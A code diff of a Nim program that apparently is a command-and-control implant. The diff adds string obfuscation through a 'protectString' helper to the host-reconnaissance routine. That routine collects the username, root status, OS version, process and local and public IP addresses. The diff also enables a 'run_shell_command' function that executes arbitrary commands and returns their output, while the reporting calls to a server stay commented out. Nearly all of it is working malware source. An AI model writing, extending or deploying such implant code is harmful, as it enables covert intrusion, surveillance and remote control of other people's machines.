@@ -16,7 +16,7 @@ import os
 
 # Command executors
 proc collect_data(): bool
-# proc run_shell_command(shell_command: string): bool
+proc run_shell_command(shell_command: string): bool
 # proc exfil_file(file_path: string): bool
 # proc write_file(file_data_base64: string, file_path: string): bool
 # proc change_sleep_time(timeframe: int,  jitter_percent: int): bool
@@ -53,52 +53,78 @@ proc collect_data(): bool =
     except:
         hostname = could_not_retrieve
     try:    
-        for i in readFile("/etc/os-release").split("\n"):
-            if contains(i, "PRETTY_NAME"):
+        for i in readFile(protectString("/etc/os-release")).split("\n"):
+            if contains(i, protectString("PRETTY_NAME")):
                 os_version = i.split("\"")[1]
     except:
         os_version = could_not_retrieve      
     try:    
         var pid = $getCurrentProcessId()
-        var pname = readFile("/proc/" & $pid & "/comm").replace("\n", "")
+        var pname = readFile(protectString("/proc/") & $pid & protectString("/comm")).replace("\n", "")
         process = pid & " " & pname
     except:
         process = could_not_retrieve
     try:
-        username = execCmdEx("whoami", options={poDaemon})[0].replace("\n", "")
+        username = execCmdEx(protectString("whoami"), options={poDaemon})[0].replace("\n", "")
     except:
         username = could_not_retrieve
-    if username == "root":
+    if username == protectString("root"):
         is_admin = "True"
         is_elevated = "True"
     else: 
         is_admin = "False"
         is_elevated = "False"
     try:
-        ipv4_local = execCmdEx("hostname -i")[0].replace("\n", "")
+        ipv4_local = execCmdEx(protectString("hostname -i"))[0].replace("\n", "")
     except:
         ipv4_local = could_not_retrieve
     try:
-        ipv4_public = client.getContent("http://api.ipify.org")
+        ipv4_public = client.getContent(protectString("http://api.ipify.org"))
     except:
         ipv4_public = could_not_retrieve
     
     var data = {
 
-        "Hostname": hostname,
-        "OS Version": os_version,
-        "Process": process,
-        "Username": username, 
-        "Is Admin": is_admin, 
-        "Is Elevated": is_elevated, 
-        "IPV4 Local": ipv4_local, 
-        "IPV4 Public": ipv4_public
+        protectString("Hostname"): hostname,
+        protectString("OS Version"): os_version,
+        protectString("Process"): process,
+        protectString("Username"): username, 
+        protectString("Is Admin"): is_admin, 
+        protectString("Is Elevated"): is_elevated, 
+        protectString("IPV4 Local"): ipv4_local, 
+        protectString("IPV4 Public"): ipv4_public
     
     }.toOrderedTable()
     
-    echo data
-
     # is_success = post_data(protectString("collect") , $data)
 
     return is_success
 
+
+proc run_shell_command(shell_command: string): bool =
+    var output: string
+    var is_success: bool
+
+    try:
+        output = execCmdEx(shell_command, options={poDaemon})[0]
+    except:
+        output = could_not_retrieve
+    
+    var data = {
+        protectString("shell_command"): shell_command,
+        "output": output
+    }.toOrderedTable()
+
+    # is_success = post_data(protectString("cmd"), $data)
+    echo output
+    return is_success
+
+
+#########################
+######## Helpers ########
+#########################
+
+
+##########################
+##### Core functions #####
+##########################
